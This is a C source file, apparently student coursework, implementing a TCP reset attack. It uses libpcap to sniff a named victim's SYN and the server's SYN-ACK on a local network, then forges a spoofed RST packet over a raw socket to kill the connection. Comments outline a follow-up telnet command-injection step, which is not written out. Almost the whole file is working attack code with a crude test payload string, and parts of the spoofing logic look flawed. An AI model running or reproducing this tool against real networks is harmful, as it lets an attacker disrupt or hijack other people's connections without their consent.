/*----------------
Done in colab with Joaquin Castanon for the course INF473X
*/
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<unistd.h>
#include<netdb.h>
#include<pthread.h>
#include<pcap.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<time.h>
#include<unistd.h>//For close()

#include<stdio.h>
#include<string.h>
#include<stdlib.h>

#include "header.h"

#define DEST_IP "127.0.0.1" //set your destination ip here
#define DEST_PORT 30000 //set the destination port here
#define TEST_STRING "Hijacked Bitch" //a test string as packet payload
#define COMMON_INTERFACE "wlp1s0"
#define PCAP_OPEN_ARG_MAC_LINUX 0//MAC - 10 , LINUX - 0

//Functions
void find_syn_request(u_char *, const struct pcap_pkthdr *, const u_char *);
void print_tcp_ip_hdr();
void send_rst(struct iphdr *, struct tcphdr *);

//some global counter
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0;
typedef unsigned char u_char;
//Pcap parameters
pcap_t *handle;
pcap_if_t *all_dev, *dev;

//global headers
struct iphdr *iph_global;
struct tcphdr *tcph_global;
struct pseudo_tcp_header psh;

int main(int argc, char *argv[]) {
/*Part 1:
-Hear the syn message from the victim
    1-Be in the same network-link as the client or the host (we assume we know the Client)
    2-Stay in listen to packages comming from client and host to find the good packages stating connection
        1- Using Pcap to listen and filter to rece
        2- Open packages and see if it's a starter package (syn == 1) and grab the important information
    3-look for a message with the syn flag coming from the victim
	4-Send the reset to end connection with the victim


Part 2:

-attack a telnet server
    -send any command you want the server to execute*/

//1.1
//A priori on est déjà dans le même lien de conexion
	char packet[65536], *data;//I don`t know if we need all this space for it
	char data_string[] = TEST_STRING;
	memset(packet, 0, 65536);

    //Data section pointer
	data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
	//fill the data section
	strncpy(data, data_string, strlen(data_string));

    //IP header global pointer
	iph_global = (struct iphdr *)packet;
	//tcph_global Pointer
	tcph_global = (struct tcphdr *)(packet + sizeof(struct iphdr));
//1.2.1
	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	bpf_u_int32 net_ip, mask;

	struct bpf_program fp;		/* The compiled filter expression */
    char filter_exp[] = "src 192.168.0.19 && tcp[tcpflags] == tcp-syn";//which IP use when we are trying to use us as host?

	//get all available devices
	
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}
	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}

    int c = 1;
	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}

    //To look into (we assume that the client is in the same connexion as us)
	dev_name = "wlp1s0";

	//look up the chosen device------------------------------------------------------------------------------
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}
    struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];

	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("NET address: %s\n", ip_char);
	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("Mask: %s\n", ip_char);
    //Open Device
	handle = pcap_open_live(dev_name, BUF_SIZE, 1, PCAP_OPEN_ARG_MAC_LINUX, err_buf);
	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}
	printf("Device %s is opened. Begin sniffing for SYN from Victim...\n", dev_name);
    logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		printf("Unable to create file.");
	}
	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return(2);
	 }
	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return(2);
	 }


	//Put the device in sniff loop
	pcap_loop(handle , -1 , find_syn_request, NULL);
	pcap_close(handle);
    print_tcp_ip_hdr();
	//--------------------------------------------------------------------------------------------------------
	//1.3 - wait for the Syn-Ack from server
	char filter_exp_2[] = "tcp[13]=18";//INCLUDE SERVER IP
	ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}
	addr.sin_addr.s_addr = net_ip;
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	//printf("NET address: %s\n", ip_char);
	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	//printf("Mask: %s\n", ip_char);
    //Open Device
	handle = pcap_open_live(dev_name, BUF_SIZE, 1, PCAP_OPEN_ARG_MAC_LINUX, err_buf);
	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}
	printf("Device %s is opened. Begin sniffing for SYN+ACK from our Server...\n", dev_name);
    if (pcap_compile(handle, &fp, filter_exp_2, 0, net_ip) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp_2, pcap_geterr(handle));
		 return(2);
	 }
	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp_2, pcap_geterr(handle));
		 return(2);
	 }
	pcap_loop(handle , 1000 , find_syn_request, NULL);//Mettre un Timeout
	pcap_close(handle);
	
	print_tcp_ip_hdr();
	//--------------------------------------------------------------------------------------------------------
	//At this moment we have all the information to pretend we are the server, so that's when we send our reset to the user
    printf("sending rst message \n");
	send_rst(iph_global,tcph_global);	
	
	
	return 0;
}


//1.2.2
//find the first package sending a Syn from our client and put the informations in our global headers
void find_syn_request(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){
//	printf("a packet is received! %d \n", total++);
	int size = header->len;

	//Get the IP Header part of this packet , excluding the ethernet header and put in the global variable which is going to be used for managing the data from server and victim
	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
	
    unsigned short iphdrlen;
	//unsigned short ethhdrlen = sizeof(struct ethhdr);
    iphdrlen = iph->ihl*4;

    //Get the TCP Header
    struct tcphdr *tcph=(struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
    //Check if there's a Syn being sent
    if(tcph->syn != 1) return; //If it's not a starter package we leave it away
    printf("We have captured a stablishing connection from our victim\n");
    fflush(stdout);    
    ++total;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
	case 1:  //ICMP Protocol
		++icmp;
		print_icmp_packet( buffer , size);
		break;

	case 2:  //IGMP Protocol
		++igmp;
		break;

	case 6:  //TCP Protocol
		++tcp;
		print_tcp_packet(buffer , size);
		break;

	case 17: //UDP Protocol
		++udp;
		print_udp_packet(buffer , size);
		break;

	default: //Some Other Protocol like ARP etc.
		++others;
		break;
	}
	printf("TCP : %d   UDP : %d   ICMP : %d   IGMP : %d   Others : %d   Total : %d\n", tcp , udp , icmp , igmp , others , total);
    
	memcpy(iph_global,iph, iphdrlen);
	memcpy(tcph_global,tcph, sizeof(struct tcphdr));
	pcap_breakloop(handle);
}
void print_tcp_ip_hdr(){
	printf("\n");
    printf( "IP Header\n");
    printf( "   |-IP Version        : %d\n",(unsigned int)iph_global->version);
    printf( "   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph_global->ihl,((unsigned int)(iph_global->ihl))*4);
    printf( "   |-Type Of Service   : %d\n",(unsigned int)iph_global->tos);
    printf( "   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph_global->tot_len));
    printf( "   |-Identification    : %d\n",ntohs(iph_global->id));
    //fprintf(logfile , "   |-Reserved ZERO Field   : %d\n",(unsigned int)iphdr->ip_reserved_zero);
    //fprintf(logfile , "   |-Dont Fragment Field   : %d\n",(unsigned int)iphdr->ip_dont_fragment);
    //fprintf(logfile , "   |-More Fragment Field   : %d\n",(unsigned int)iphdr->ip_more_fragment);
    printf("   |-TTL      : %d\n",(unsigned int)iph_global->ttl);
    printf("   |-Protocol : %d\n",(unsigned int)iph_global->protocol);
    printf("   |-Checksum : %d\n",ntohs(iph_global->check));
	
	unsigned int ip = iph_global->saddr;

    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;   

    printf("   |-Source IP        : %d.%d.%d.%d\n" , bytes[0], bytes[1], bytes[2], bytes[3]);

	ip = iph_global->daddr;
	bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
	printf("   |-Destination IP   : %d.%d.%d.%d\n" , bytes[0], bytes[1], bytes[2], bytes[3]);

	printf(  "\n");
    printf(  "TCP Header\n");
    printf(  "   |-Source Port      : %u\n",ntohs(tcph_global->source));
    printf(  "   |-Destination Port : %u\n",ntohs(tcph_global->dest));
    printf(  "   |-Sequence Number    : %u\n",ntohl(tcph_global->seq));
    printf(  "   |-Acknowledge Number : %u\n",ntohl(tcph_global->ack_seq));
    printf(  "   |-Header Length      : %d DWORDS or %d BYTES\n" ,(unsigned int)tcph_global->doff,(unsigned int)tcph_global->doff*4);
    //fprint(logfile , "   |-CWR Flag : %d\n",(unsigned int)tcph_global->cwr);
    //fprint(logfile , "   |-ECN Flag : %d\n",(unsigned int)tcph_global->ece);
    printf(  "   |-Urgent Flag          : %d\n",(unsigned int)tcph_global->urg);
    printf(  "   |-Acknowledgement Flag : %d\n",(unsigned int)tcph_global->ack);
    printf(  "   |-Push Flag            : %d\n",(unsigned int)tcph_global->psh);
    printf(  "   |-Reset Flag           : %d\n",(unsigned int)tcph_global->rst);
    printf(  "   |-Synchronise Flag     : %d\n",(unsigned int)tcph_global->syn);
    printf(  "   |-Finish Flag          : %d\n",(unsigned int)tcph_global->fin);
    printf(  "   |-Window         : %d\n",ntohs(tcph_global->window));
    printf(  "   |-Checksum       : %d\n",ntohs(tcph_global->check));
    printf(  "   |-Urgent Pointer : %d\n",tcph_global->urg_ptr);
    printf(  "\n");

}
//1.3
void send_rst(struct iphdr *srv_iphd, struct tcphdr *srv_tcphd){
    
    //socket
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
    if(fd < 0){perror("Error creating raw socket ");exit(1);}

    //le packet à envoyer
    char packet[65536];//I don`t know if we need all this space for it
    memset(packet, 0, 65536);

    //IP header pointer
    struct iphdr *iph = (struct iphdr *)packet;

    //TCP header pointer
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_tcp_header psh; //pseudo header

    //fill the IP header here
    iph->version = 4; //s'il utilise ipv6 on est pas bien
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
    iph->id = 0;
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = 6;//6 pour TCP
    iph->saddr = srv_iphd->saddr;
    iph->daddr = srv_iphd->daddr;

    iph->check = checksum((unsigned short*) packet, iph->tot_len);
    
    //Filling the TCP Header
    tcph->source = srv_tcphd->source;
    tcph->dest = srv_tcphd->dest;
    tcph->seq = srv_tcphd->seq + 1;
    tcph->syn= 0;
    tcph->fin = 0;
    tcph->rst=1;//RST flag
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->ack_seq = 0;
    tcph->urg=0;
    tcph->window = htons(5840);//Maximum window size allowed
    tcph->doff=5;//TCP header size
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    psh.dest_address = iph->daddr;
    psh.source_address = iph->saddr;
    psh.protocol = 6;
    psh.tcp_length = htons(sizeof(struct tcphdr));
    psh.placeholder = 0;
    
    int psize = sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr);
    char *pseudogram = malloc(psize);
    
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_tcp_header));
    memcpy(pseudogram + sizeof(struct pseudo_tcp_header) , tcph , sizeof(struct tcphdr));
    
    tcph->check = checksum( (unsigned short*) pseudogram , psize);
    
    //destination socket
    struct sockaddr_in dest;
    dest.sin_addr.s_addr=iph->daddr;
    dest.sin_family=AF_INET;
    dest.sin_port=tcph->dest;

    //send the rst packet
    if(sendto(fd, packet, iph->tot_len, 0, (const struct  sockaddr *)&dest, sizeof(dest))==-1){
        printf("Unable to send package\n");
    }
}